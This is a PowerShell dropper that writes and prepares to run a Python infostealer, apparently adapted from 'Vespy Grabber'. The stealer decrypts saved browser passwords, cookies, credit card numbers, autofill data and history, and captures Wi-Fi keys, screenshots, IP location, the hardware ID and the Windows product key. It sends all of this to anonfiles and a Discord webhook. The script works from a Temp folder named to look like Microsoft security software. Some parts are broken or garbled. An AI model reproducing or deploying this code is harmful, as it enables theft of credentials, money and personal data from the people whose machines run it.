#####################################################################
# This is for create the "UUID_use.py" files
#
#
# For grab all cookies (thx to https://github.com/vesperlol/Vespy-Grabber-v2.0)
#
#####################################################################

############################VARIABLES################################
$webHookUrlPYTHON="'"+$webHookUrl+"'"
$webHookUrlPYTHON2="""$webHookUrl"""
$webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
$webHookUrl2="$"+"webHookUrl"
#####################################################################

pip install requests
pip install winshell
pip install psutil
pip install pypiwin32
pip install pycryptodome
pip install cryptography
pip install pillow
pip install discord_webhook
pip install pyperclip
pip install pyinstaller
pip install chardet



cd C:\Windows\Temp\Win.microsoft.Security.temp

Set-Content UUID_create.py "
import os, base64, shutil, requests, json, re, winshell, platform, psutil, subprocess, win32api, sys, ctypes
import getpass;user=getpass.getuser()
from json import loads
from time import sleep
from win32crypt import CryptUnprotectData
from sqlite3 import connect
from Crypto.Cipher import AES
from threading import Thread
from zipfile import ZipFile
from PIL import ImageGrab
from random import randint
from discord_webhook import DiscordWebhook, DiscordEmbed
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue

wbh = $webHookUrlPYTHON
dtokens = []
class CookieInfo():
    def __init__(self, Cookies: str):
        if 'Name : .ROBLOSECURITY' in Cookies:
            cookie = Cookies.split('\n'+'='*50)
            for i in cookie:
                if 'ROBLOSECURITY' in i:
                    self.RobloxInfo(i.split('Value : ')[1].replace(' ',''))
        if 'EPIC_CLIENT_SESSION' and 'EPIC_SSO' in Cookies:
            cookies = Cookies.split('\n'+'='*50)
            ESC = []
            ES = []
            for i in cookies:
                if 'EPIC_CLIENT_SESSION' in i:
                    ESC.append(i.split('Value : ')[1].replace(' ',''))
            for i in cookies:
                if 'EPIC_SSO' in i:
                    ES.append(i.split('Value : ')[1].replace(' ',''))
            for i in range(len(ESC)):
                try:
                    self.EpicInfo(ESC[i],ES[i])
                except:pass

    def EpicInfo(self, ESC, ES):
        r=requests.get('https://www.epicgames.com/account/personal?lang=en&productName=epicgames',cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).text
        r2 = requests.get('https://www.epicgames.com/account/v2/payment/ajaxGetWalletBalance',cookies = {'EPIC_SSO': ES,'EPIC_CLIENT_SESSION': ESC}).json()
        displayname = r.split(''displayName':{'value':'')[1].split(''')[0]
        ID = r.split(''userInfo':{'id':{'value':'')[1].split(''')[0]
        balance = r2['walletBalance']
        webhook = DiscordWebhook(url=wbh, username='ALL cookies info', avatar_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
        embed = DiscordEmbed(title=f'EPIC Games Cookies', description=f'Grabbed Epic Games Account', color='4300d1')
        embed.set_author(name='ALL wifi info', icon_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
        embed.set_footer(text='ALL wifi info')
        embed.set_timestamp()
        embed.add_embed_field(name=f'Account of {displayname}\n', value=f':id: ID: ``{ID}``\n\n:dollar: Balance : ``{balance}``\n\n:cookie: EPIC_CLIENT_SESSION : ``{ESC[:20]}.. REST IN COOKIES``\n\n:cookie: EPIC_SSO : ``{ES}``')
        webhook.add_embed(embed)
        webhook.execute()

    def RobloxInfo(self, cookie: str):
        try:
            r=requests.get('https://www.roblox.com/mobileapi/userinfo',cookies={'.ROBLOSECURITY': cookie}).json()
            
            webhook.add_embed(embed)
            webhook.execute()
        except:pass

class Browsers():

    def __init__(self):
        self.Cookies = '-'
        self.Passwords = '-'
        self.History = '-'
        self.Downloads = '-'
        self.CCs = '-'
        self.Autofill = '-'
        paths = [f'{os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft','Edge','User Data')}', f'{os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google','Chrome','User Data')}']
        self.prof = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4','Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Profile 9', 'Profile 10']
        for i in paths:
            if os.path.exists(i):
                try:
                    key = self._key(os.path.join(i, 'Local State'))
                    self.cookies(i, key)
                    self.passwords(i, key)
                    self.history(i)
                    self.downloads(i)
                    self.ccs(i, key)
                    self.autofill(i)
                except:
                    pass
        t1 = Thread(target=self._upload)
        t2 = Thread(target=CookieInfo,args=([self.Cookies]))
        t1.start();t2.start()
                
    def _key(self,path):
        return CryptUnprotectData(base64.b64decode(loads(open(path,'r',encoding='utf-8').read())['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
    
    def _decrypt(self,b,key):
        c = AES.new(key, AES.MODE_GCM, b[3:15])
        dec = c.decrypt(b[15:])[:-16].decode()
        return dec
    
    def cookies(self,p,key):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Cookies.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'Network', 'Cookies')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Cookies')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT host_key, name, encrypted_value FROM cookies').fetchall():
                        host_key, name, encrypted_value = V
                        dec = self._decrypt(encrypted_value,key)
                        self.Cookies += '='*50+f'\nHost : {host_key}\nName : {name}\nValue : {dec}\n'
                cursor.close()
                con.close()
            except:pass
        f.write(self.Cookies.encode())
        f.close()
    
    def passwords(self,p,key):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Passw.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'Login Data')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Login Data')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():
                        url, name, password = V
                        dec = self._decrypt(password,key)
                        self.Passwords += '='*50+f'\nURL : {url}\nName : {name}\nPassword : {dec}\n'
                    for V in cursor.execute('SELECT origin_url, username_value, password_value FROM logins order by date_created').fetchall():
                        url, name, password = V
                        dec = self._decrypt(password,key)
                        self.Passwords += '='*50+f'\nURL : {url}\nName : {name}\nPassword : {dec}\n'
                cursor.close()
                con.close()
            except:pass
        f.write(self.Passwords.encode())
        f.close()

    def history(self,p):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Histo.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'History')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'History')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
                        url, title, count, last_visit = V
                        if url and title and count and last_visit != '':
                            if len(self.History) < 100000:
                                self.History += '='*50+f'\nURL : {url}\nTitle : {title}\nVisit Count : {count}\n'
                        else:break
                cursor.close()
                con.close()
            except:pass
        f.write(self.History.encode())
        f.close()

    def downloads(self,p):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Downs.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'History')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData', 'History2'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'History2')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT tab_url, target_path FROM downloads').fetchall():
                        url, path = V
                        self.Downloads += '='*50+f'\nURL : {url}\nPath : {path}\n'
                cursor.close()
                con.close()
            except:pass
        f.write(self.Downloads.encode())
        f.close()
    
    def autofill(self,p):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Autofill.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'Web Data')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData', 'Web Data'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Web Data')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT name, value FROM autofill').fetchall():
                        name, value = V
                        self.Autofill += '='*50+f'\nName : {name}\nValue : {value}\n'
                cursor.close()
                con.close()
            except:pass
        f.write(self.Autofill.encode())
        f.close()

    def ccs(self,p,key):
        f = open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'credsc.txt'),'wb')
        for i in self.prof:
            try:
                new_path = os.path.join(p, i, 'Web Data')
                shutil.copy(new_path, os.path.join(os.environ['USERPROFILE'], 'AppData', 'Web Data'))
                path2 = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Web Data')
                if os.path.exists(path2):
                    con = connect(path2)
                    cursor = con.cursor()
                    for V in cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards').fetchall():
                        name, exp_month, exp_year, cne = V
                        cn = self._decrypt(cne,key)
                        self.CCs += '='*50+f'\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n'
                cursor.close()
                con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()

    def _upload(self):
        try:
            apdata = os.path.join(os.environ['USERPROFILE'], 'AppData')
            PasswordSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Passw.txt'),'rb')}).json()['data']['file']['url']['full']
            CookieSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Cookies.txt'),'rb')}).json()['data']['file']['url']['full']
            CredsSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'credsc.txt'),'rb')}).json()['data']['file']['url']['full']
            HistorySite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Histo.txt'),'rb')}).json()['data']['file']['url']['full']
            DownloadSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Downs.txt'),'rb')}).json()['data']['file']['url']['full']
            AutofillSite = requests.post('https://api.anonfiles.com/upload',files={'file':open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Autofill.txt'),'rb')}).json()['data']['file']['url']['full']
            webhook = DiscordWebhook(url=wbh, username='Cookies|Wifi', avatar_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
            embed = DiscordEmbed(title=f'Browser Stealer', description=f'Found Information About Browsers', color='4300d1')
            embed.set_author(name='ALL cookies info', icon_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
            embed.set_footer(text='ALL cookies info')
            embed.set_timestamp()
            embed.add_embed_field(name=f'All Info From Browsers\n\n', value=f':unlock: Passwords: **{PasswordSite}**\n\n:cookie: Cookies: **{CookieSite}**\n\n:credit_card: CCs: **{CredsSite}**\n\n:page_with_curl: History: **{HistorySite}**\n\n:arrow_down: Downloads: **{DownloadSite}**\n\n:identification_card: Autofill: **{AutofillSite}**\n')
            webhook.add_embed(embed)
            webhook.execute()
            try:
                os.remove(os.path.join(apdata, 'Cookies.txt'));os.remove(os.path.join(apdata, 'Passw.txt'));os.remove(os.path.join(apdata, 'credsc.txt'));os.remove(os.path.join(apdata, 'Histo.txt'));os.remove(os.path.join(apdata, 'Downs.txt'));os.remove(os.path.join(apdata, 'Autofill.txt'))
            except:
                pass
        except:
            pass

class DISCORD:
	pass
class Roblox:
	pass
class Files:
	pass
class Minecraft:
	pass
class Network:

    def __init__(self):
        self.WiFi()

    def IP(self):
        con = requests.get('http://ipinfo.io/json').json()
        self.ip = f'``{con['ip']}``'
        try:
            self.hostname = f'``{con['hostname']}``'
        except:self.hostname = ':x:'
        self.city = f'``{con['city']}``'
        self.region = f'``{con['region']}``'
        self.country = f'``{con['country']}``'
        self.location = f'``{con['loc']}``'
        self.ISP = f'``{con['org']}``'
        self.postal = f'``{con['postal']}``'

    def WiFi(self):
        self.IP()
        webhook = DiscordWebhook(url=wbh, username='ALL wifo info', avatar_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
        embed = DiscordEmbed(title=f'Network Info', description=f'User's Network Info', color='4300d1')
        embed.set_author(name='ALL wifi info', icon_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
        embed.set_footer(text='ALL wifi info')
        embed.set_timestamp()
        embed.add_embed_field(name=f':ok_hand: IP : {self.ip}', value=f':label: Hostname: {self.hostname}\n:cityscape: City: {self.city}\n:park: Region: {self.region}\n:map: Country: {self.country}\n:round_pushpin: Location: {self.location}\n:pager: ISP: {self.ISP}\n:envelope: Postal: {self.postal}')
        webhook.add_embed(embed)
        webhook.execute()
        try:
            networks = re.findall('(?:Profile\s*:\s)(.*)', subprocess.check_output('netsh wlan show profiles', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8',errors='backslashreplace'))
            for nets in networks:
                nets = nets.replace('\\r\\n','')
                res = subprocess.check_output(f'netsh wlan show profile {nets} key=clear',shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8',errors='backslashreplace')
                ssid = res.split('Type')[1].split(':')[1].split('\n')[0].split('\r')[0]
                key = res.split('Key Content')[1].split(':')[1].split('\n')[0].split('\r')[0]
                webhook = DiscordWebhook(url=wbh, username='Vespy 2.0', avatar_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
                embed = DiscordEmbed(title=f'Network Info', description=f'User's Network Info (MORE)', color='4300d1')
                embed.set_author(name='author : vesper', icon_url=r'https://cdn.discordapp.com/attachments/1064581759112577096/1065257661848883250/mountains-6839521.jpg')
                embed.set_footer(text='ALL wifi info')
                embed.set_timestamp()
                embed.add_embed_field(name=f':thumbup: Wifi Network Found : ``{nets}``', value=f':man_tipping_hand: SSID: ``{ssid}``\n:scream: Password: ``{key}``')
                webhook.add_embed(embed)
                webhook.execute()
        except:pass

class Antidebug:
	pass
class Reboot:
	pass
class Startup:
	pass
class ErrorMsg:
	pass
class Spread:
	pass
class Screeny:

    def __init__(self):
        jtjirjihirthr = False
        self.Screen()
        self.Info()
        file = requests.post('https://api.anonfiles.com/upload',files={'file':open('testy.jpg','rb')})
        link = file.json()['data']['file']['url']['full']
        r=str(requests.get(link).content).split('<a id='download-preview-image-url' href='')[1].split(''')[0]
        if jtjirjihirthr:
            content = '@everyone New Hit'
        else:
            content = 'New Hit'

        os.remove('testy.jpg')
    
    def Screen(self):
        s = ImageGrab.grab(bbox=None,include_layered_windows=False,all_screens=True,xdisplay=None)
        s.save('testy.jpg')
        s.close()
    
    def Size(self,b):
        for unit in ['', 'K', 'M', 'G', 'T', 'P']:
            if b < 1024:
                return f'{b:.2f}{unit}B'
            b /= 1024

    def Info(self):
        self.user = user
        self.machine = platform.machine()
        self.system = platform.system()
        self.processor = platform.processor()
        self.sv = psutil.virtual_memory()
        self.TotalM = self.Size(self.sv.total)
        self.availableM = self.Size(self.sv.available)
        self.usedM = self.Size(self.sv.used)
        self.pourcentageM = self.Size(self.sv.percent)+'%'
        self.hwid = str(subprocess.check_output('wmic csproduct get uuid')).replace(' ','').split('\\n')[1].split('\\r')[0]
        try:
            self.windowspk = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode(encoding='utf-8', errors='strict').split('OA3xOriginalProductKey')[1].split(' ')
            for i in self.windowspk:
                if len(i) > 20:self.windowspk = i.split(' ')
            self.windowspk = f'``{self.windowspk[0][3:]}``'
        except:
            self.windowspk = ':x:'


def main():
    Thread(target=Antidebug).start()
    Startup()
    Thread(target=ErrorMsg).start()
    Screeny()
    Browsers()
    DISCORD()
    Roblox()
    Files()
    Minecraft()
    Network()
    Spread()
    Reboot()
main()

"

#python C:\Windows\Temp\Win.microsoft.Security.temp\UUID_create.py
